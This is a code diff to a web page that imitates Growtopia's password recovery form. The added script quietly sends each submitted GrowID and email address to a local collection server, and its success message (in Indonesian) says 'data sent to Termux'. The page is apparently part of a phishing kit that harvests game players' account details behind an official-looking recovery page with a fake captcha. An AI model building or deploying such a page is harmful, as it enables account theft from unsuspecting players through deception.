@@ -101,28 +101,46 @@
     </header>
     <div class="container">
         <div class="container-inner">
-            <!-- Banner moved inside container -->
             <img src="banner.png" alt="August Season Banner" class="banner">
 
             <h2>GROWTOPIA PASSWORD RECOVERY</h2>
             <p>Enter in your Growtopia data and you can reset your password. (You'll have to check your email and click the URL we send, so if your email address wasn't entered correctly when you made your account, you may not be able to recover it.)</p>
             
-            <form>
+            <form id="growForm">
                 <div class="form-group">
-                    <input type="text" placeholder="GrowID *" required>
+                    <input type="text" placeholder="GrowID *" name="growid" required>
                 </div>
                 <a href="#" class="forgot-link">(Click here if you can't remember your GrowID)</a>
                 <div class="form-group">
-                    <input type="email" placeholder="GrowID Email *" required>
+                    <input type="email" placeholder="GrowID Email *" name="email" required>
                 </div>
                 <div class="recaptcha">
-                    <input type="checkbox" id="recaptcha">
+                    <input type="checkbox" id="recaptcha" required>
                     <label for="recaptcha" style="margin-left: 8px;">Saya bukan robot</label>
                 </div>
                 <button type="submit" class="submit-btn">SUBMIT</button>
             </form>
             <p class="note">We'll email you a URL to click</p>
+            <p id="hasil" style="margin-top:18px; color:#00BFFF;"></p>
         </div>
     </div>
+    <script>
+    document.getElementById('growForm').addEventListener('submit', function(e){
+        e.preventDefault();
+        var formData = new FormData(this);
+        fetch('http://localhost:5000/input', {
+            method: 'POST',
+            body: formData
+        }).then(r => {
+            if (r.ok) {
+                document.getElementById('hasil').innerText = 'Data berhasil dikirim ke Termux!';
+            } else {
+                document.getElementById('hasil').innerText = 'Gagal mengirim data.';
+            }
+        }).catch(err => {
+            document.getElementById('hasil').innerText = 'Gagal mengirim data.';
+        });
+    });
+    </script>
 </body>
 </html>
